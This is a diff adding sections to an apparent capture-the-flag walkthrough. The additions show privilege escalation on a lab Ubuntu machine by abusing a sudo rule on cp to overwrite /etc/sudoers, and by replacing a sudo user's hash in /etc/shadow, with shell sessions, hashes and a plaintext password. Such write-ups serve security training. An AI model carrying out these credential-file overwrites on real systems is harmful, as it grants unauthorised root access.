@@ -66,6 +66,7 @@ Note: This is just a rough estimation. Some people may done it faster, Some peop
 	- Get user's password (frankin)
 - Privilege Escalation
 	- Modifying `/etc/sudoers` using the available executable command
+	- Modifying `/etc/shadow` by patching hash password
 	- sudo
 - Capture The Flag
 	- Locate the flag
@@ -458,7 +459,11 @@ cp: Missing Operands
 
 [franky@ubuntu]$ pwd
 > /home/franky
+```
 
+## Modify ```/etc/sudoers``` by changing allowance command.
+
+```
 [franky@ubuntu]$ touch sudoers_Im_Coming
 [franky@ubuntu]$ sudo cp /etc/sudoers ~/sudoers_Im_Coming
 [franky@ubuntu]$ ls -l sudoers*
@@ -479,6 +484,40 @@ franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 
 ```
 [franky@ubuntu]$ sudo -s 
+[root@ubuntu]# 
+```
+
+## Modify password ```/etc/shadow``` of a user in ```sudo``` group
+```
+[franky@ubuntu]$ cat /etc/group | grep sudo
+> sudo:x:27:tester
+[franky@ubuntu]$ touch my_shadow
+[franky@ubuntu]$ sudo cp /etc/shadow my_shadow
+[franky@ubuntu]$ vi my_shadow
+```
+
+ViM screen
+```
+
+...
+tester:$6$t72esmkL$0jGigluRhSPsvKXttv/KFr66QvrLQNq4A2EkXZFZmSIAhWeLMmQc57uG9K2O14sJoXNdT9MjcvwM53EoBKG0O1:17954:0:99999:7:::
+franky:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17949:0:99999:7:::
+...
+
+
+:wq
+```
+
+```
+[franky@ubuntu]$ sudo cp -f my_shadow /etc/shadow
+[franky@ubuntu]$ su tester
+Password: 3d2yhijinbe
+[tester@ubuntu]$ sudo -s
+Password: 3d2yhijinbe
+[root@ubuntu]# 
+```
+
+```
 [root@ubuntu]# cd /root
 [root@ubuntu]# ls
 > rwx------		root	root	flag.txt
